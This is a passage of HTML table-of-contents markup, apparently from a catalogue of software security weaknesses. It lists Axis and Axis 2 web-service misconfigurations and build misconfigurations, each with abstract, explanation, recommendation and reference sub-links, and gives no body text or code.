href="#RECOMMENDATIONS-143"><span class="toc-number">1.4.3.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-142"><span class="toc-number">1.4.3.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Axis-2-Service-Provider-Misconfiguration-Inbound-WS-Security-Not-Enabled"><span class="toc-number">1.4.4.</span> <span class="toc-text">Axis 2 Service Provider Misconfiguration: Inbound WS-Security Not Enabled</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-144"><span class="toc-number">1.4.4.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-145"><span class="toc-number">1.4.4.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-144"><span class="toc-number">1.4.4.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-143"><span class="toc-number">1.4.4.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Axis-2-Service-Provider-Misconfiguration-Missing-Inbound-Encryption"><span class="toc-number">1.4.5.</span> <span class="toc-text">Axis 2 Service Provider Misconfiguration: Missing Inbound Encryption</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-145"><span class="toc-number">1.4.5.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-146"><span class="toc-number">1.4.5.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-145"><span class="toc-number">1.4.5.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-144"><span class="toc-number">1.4.5.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Axis-2-Service-Provider-Misconfiguration-Missing-Inbound-Signature"><span class="toc-number">1.4.6.</span> <span class="toc-text">Axis 2 Service Provider Misconfiguration: Missing Inbound Signature</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-146"><span class="toc-number">1.4.6.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-147"><span class="toc-number">1.4.6.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-146"><span class="toc-number">1.4.6.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-145"><span class="toc-number">1.4.6.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Axis-2-Service-Provider-Misconfiguration-Missing-Inbound-Timestamp"><span class="toc-number">1.4.7.</span> <span class="toc-text">Axis 2 Service Provider Misconfiguration: Missing Inbound Timestamp</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-147"><span class="toc-number">1.4.7.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-148"><span class="toc-number">1.4.7.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-147"><span class="toc-number">1.4.7.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-146"><span class="toc-number">1.4.7.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Axis-2-Service-Provider-Misconfiguration-Missing-Outbound-Encryption"><span class="toc-number">1.4.8.</span> <span class="toc-text">Axis 2 Service Provider Misconfiguration: Missing Outbound Encryption</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-148"><span class="toc-number">1.4.8.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-149"><span class="toc-number">1.4.8.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-148"><span class="toc-number">1.4.8.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-147"><span class="toc-number">1.4.8.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Axis-2-Service-Provider-Misconfiguration-Missing-Outbound-Signature"><span class="toc-number">1.4.9.</span> <span class="toc-text">Axis 2 Service Provider Misconfiguration: Missing Outbound Signature</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-149"><span class="toc-number">1.4.9.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-150"><span class="toc-number">1.4.9.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-149"><span class="toc-number">1.4.9.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-148"><span class="toc-number">1.4.9.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Axis-2-Service-Provider-Misconfiguration-Missing-Outbound-Timestamp"><span class="toc-number">1.4.10.</span> <span class="toc-text">Axis 2 Service Provider Misconfiguration: Missing Outbound Timestamp</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-150"><span class="toc-number">1.4.10.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-151"><span class="toc-number">1.4.10.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-150"><span class="toc-number">1.4.10.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-149"><span class="toc-number">1.4.10.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Axis-2-Service-Provider-Misconfiguration-Outbound-WS-Security-Not-Enabled"><span class="toc-number">1.4.11.</span> <span class="toc-text">Axis 2 Service Provider Misconfiguration: Outbound WS-Security Not Enabled</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-151"><span class="toc-number">1.4.11.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-152"><span class="toc-number">1.4.11.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-151"><span class="toc-number">1.4.11.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-150"><span class="toc-number">1.4.11.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Axis-2-Service-Provider-Misconfiguration-Unsigned-Inbound-Timestamp"><span class="toc-number">1.4.12.</span> <span class="toc-text">Axis 2 Service Provider Misconfiguration: Unsigned Inbound Timestamp</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-152"><span class="toc-number">1.4.12.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-153"><span class="toc-number">1.4.12.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-152"><span class="toc-number">1.4.12.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-151"><span class="toc-number">1.4.12.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Axis-2-Service-Provider-Misconfiguration-Unsigned-Outbound-Timestamp"><span class="toc-number">1.4.13.</span> <span class="toc-text">Axis 2 Service Provider Misconfiguration: Unsigned Outbound Timestamp</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-153"><span class="toc-number">1.4.13.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-154"><span class="toc-number">1.4.13.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-153"><span class="toc-number">1.4.13.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-152"><span class="toc-number">1.4.13.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Axis-2-Service-Provider-Misconfiguration-WS-Security-Not-Enabled"><span class="toc-number">1.4.14.</span> <span class="toc-text">Axis 2 Service Provider Misconfiguration: WS-Security Not Enabled</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-154"><span class="toc-number">1.4.14.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-155"><span class="toc-number">1.4.14.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-154"><span class="toc-number">1.4.14.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-153"><span class="toc-number">1.4.14.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Axis-2-Service-Provider-Misconfiguration-Weak-Token"><span class="toc-number">1.4.15.</span> <span class="toc-text">Axis 2 Service Provider Misconfiguration: Weak Token</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-155"><span class="toc-number">1.4.15.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-156"><span class="toc-number">1.4.15.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-155"><span class="toc-number">1.4.15.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-154"><span class="toc-number">1.4.15.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Axis-2-Service-Requester-Misconfiguration-Inbound-WS-Security-Not-Enabled"><span class="toc-number">1.4.16.</span> <span class="toc-text">Axis 2 Service Requester Misconfiguration: Inbound WS-Security Not Enabled</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-156"><span class="toc-number">1.4.16.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-157"><span class="toc-number">1.4.16.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-156"><span class="toc-number">1.4.16.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-155"><span class="toc-number">1.4.16.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Axis-2-Service-Requester-Misconfiguration-Missing-Inbound-Encryption"><span class="toc-number">1.4.17.</span> <span class="toc-text">Axis 2 Service Requester Misconfiguration: Missing Inbound Encryption</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-157"><span class="toc-number">1.4.17.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-158"><span class="toc-number">1.4.17.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-157"><span class="toc-number">1.4.17.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-156"><span class="toc-number">1.4.17.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Axis-2-Service-Requester-Misconfiguration-Missing-Inbound-Signature"><span class="toc-number">1.4.18.</span> <span class="toc-text">Axis 2 Service Requester Misconfiguration: Missing Inbound Signature</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-158"><span class="toc-number">1.4.18.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-159"><span class="toc-number">1.4.18.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-158"><span class="toc-number">1.4.18.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-157"><span class="toc-number">1.4.18.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Axis-2-Service-Requester-Misconfiguration-Missing-Inbound-Timestamp"><span class="toc-number">1.4.19.</span> <span class="toc-text">Axis 2 Service Requester Misconfiguration: Missing Inbound Timestamp</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-159"><span class="toc-number">1.4.19.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-160"><span class="toc-number">1.4.19.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-159"><span class="toc-number">1.4.19.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-158"><span class="toc-number">1.4.19.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Axis-2-Service-Requester-Misconfiguration-Missing-Outbound-Encryption"><span class="toc-number">1.4.20.</span> <span class="toc-text">Axis 2 Service Requester Misconfiguration: Missing Outbound Encryption</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-160"><span class="toc-number">1.4.20.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-161"><span class="toc-number">1.4.20.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-160"><span class="toc-number">1.4.20.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-159"><span class="toc-number">1.4.20.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Axis-2-Service-Requester-Misconfiguration-Missing-Outbound-Signature"><span class="toc-number">1.4.21.</span> <span class="toc-text">Axis 2 Service Requester Misconfiguration: Missing Outbound Signature</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-161"><span class="toc-number">1.4.21.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-162"><span class="toc-number">1.4.21.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-161"><span class="toc-number">1.4.21.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-160"><span class="toc-number">1.4.21.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Axis-2-Service-Requester-Misconfiguration-Missing-Outbound-Timestamp"><span class="toc-number">1.4.22.</span> <span class="toc-text">Axis 2 Service Requester Misconfiguration: Missing Outbound Timestamp</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-162"><span class="toc-number">1.4.22.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-163"><span class="toc-number">1.4.22.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-162"><span class="toc-number">1.4.22.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-161"><span class="toc-number">1.4.22.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Axis-2-Service-Requester-Misconfiguration-Outbound-WS-Security-Not-Enabled"><span class="toc-number">1.4.23.</span> <span class="toc-text">Axis 2 Service Requester Misconfiguration: Outbound WS-Security Not Enabled</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-163"><span class="toc-number">1.4.23.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-164"><span class="toc-number">1.4.23.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-163"><span class="toc-number">1.4.23.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-162"><span class="toc-number">1.4.23.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Axis-2-Service-Requester-Misconfiguration-Plain-Text-Password"><span class="toc-number">1.4.24.</span> <span class="toc-text">Axis 2 Service Requester Misconfiguration: Plain Text Password</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-164"><span class="toc-number">1.4.24.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-165"><span class="toc-number">1.4.24.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-164"><span class="toc-number">1.4.24.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-163"><span class="toc-number">1.4.24.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Axis-2-Service-Requester-Misconfiguration-Unsigned-Inbound-Timestamp"><span class="toc-number">1.4.25.</span> <span class="toc-text">Axis 2 Service Requester Misconfiguration: Unsigned Inbound Timestamp</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-165"><span class="toc-number">1.4.25.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-166"><span class="toc-number">1.4.25.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-165"><span class="toc-number">1.4.25.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-164"><span class="toc-number">1.4.25.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Axis-2-Service-Requester-Misconfiguration-Unsigned-Outbound-Timestamp"><span class="toc-number">1.4.26.</span> <span class="toc-text">Axis 2 Service Requester Misconfiguration: Unsigned Outbound Timestamp</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-166"><span class="toc-number">1.4.26.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-167"><span class="toc-number">1.4.26.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-166"><span class="toc-number">1.4.26.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-165"><span class="toc-number">1.4.26.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Axis-2-Service-Requester-Misconfiguration-WS-Security-Not-Enabled"><span class="toc-number">1.4.27.</span> <span class="toc-text">Axis 2 Service Requester Misconfiguration: WS-Security Not Enabled</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-167"><span class="toc-number">1.4.27.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-168"><span class="toc-number">1.4.27.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-167"><span class="toc-number">1.4.27.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-166"><span class="toc-number">1.4.27.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Axis-2-Service-Requester-Misconfiguration-Weak-Token"><span class="toc-number">1.4.28.</span> <span class="toc-text">Axis 2 Service Requester Misconfiguration: Weak Token</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-168"><span class="toc-number">1.4.28.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-169"><span class="toc-number">1.4.28.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-168"><span class="toc-number">1.4.28.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-167"><span class="toc-number">1.4.28.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Axis-Misconfiguration-Debug-Information"><span class="toc-number">1.4.29.</span> <span class="toc-text">Axis Misconfiguration: Debug Information</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-169"><span class="toc-number">1.4.29.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-170"><span class="toc-number">1.4.29.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-169"><span class="toc-number">1.4.29.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-168"><span class="toc-number">1.4.29.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Axis-Misconfiguration-Service-Enumeration"><span class="toc-number">1.4.30.</span> <span class="toc-text">Axis Misconfiguration: Service Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-170"><span class="toc-number">1.4.30.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-171"><span class="toc-number">1.4.30.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-170"><span class="toc-number">1.4.30.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-169"><span class="toc-number">1.4.30.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Axis-Service-Provider-Misconfiguration-Plain-Text-Password"><span class="toc-number">1.4.31.</span> <span class="toc-text">Axis Service Provider Misconfiguration: Plain Text Password</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-171"><span class="toc-number">1.4.31.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-172"><span class="toc-number">1.4.31.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-171"><span class="toc-number">1.4.31.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-170"><span class="toc-number">1.4.31.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Axis-Service-Provider-Misconfiguration-Weak-Token"><span class="toc-number">1.4.32.</span> <span class="toc-text">Axis Service Provider Misconfiguration: Weak Token</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-172"><span class="toc-number">1.4.32.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-173"><span class="toc-number">1.4.32.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-172"><span class="toc-number">1.4.32.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-171"><span class="toc-number">1.4.32.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Axis-Service-Requester-Misconfiguration-Plain-Text-Password"><span class="toc-number">1.4.33.</span> <span class="toc-text">Axis Service Requester Misconfiguration: Plain Text Password</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-173"><span class="toc-number">1.4.33.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-174"><span class="toc-number">1.4.33.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-173"><span class="toc-number">1.4.33.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-172"><span class="toc-number">1.4.33.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Axis-Service-Requester-Misconfiguration-Weak-Token"><span class="toc-number">1.4.34.</span> <span class="toc-text">Axis Service Requester Misconfiguration: Weak Token</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-174"><span class="toc-number">1.4.34.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-175"><span class="toc-number">1.4.34.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-174"><span class="toc-number">1.4.34.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-173"><span class="toc-number">1.4.34.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Build-Misconfiguration-Dynamic-Dependency-Version-Usage"><span class="toc-number">1.4.35.</span> <span class="toc-text">Build Misconfiguration: Dynamic Dependency Version Usage</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-175"><span class="toc-number">1.4.35.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-176"><span class="toc-number">1.4.35.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-175"><span class="toc-number">1.4.35.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-174"><span class="toc-number">1.4.35.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Build-Misconfiguration-External-Ant-Dependency-Repository"><span class="toc-number">1.4.36.</span> <span class="toc-text">Build Misconfiguration: External Ant Dependency Repository</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-176"><span class="toc-number">1.4.36.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-177"><span 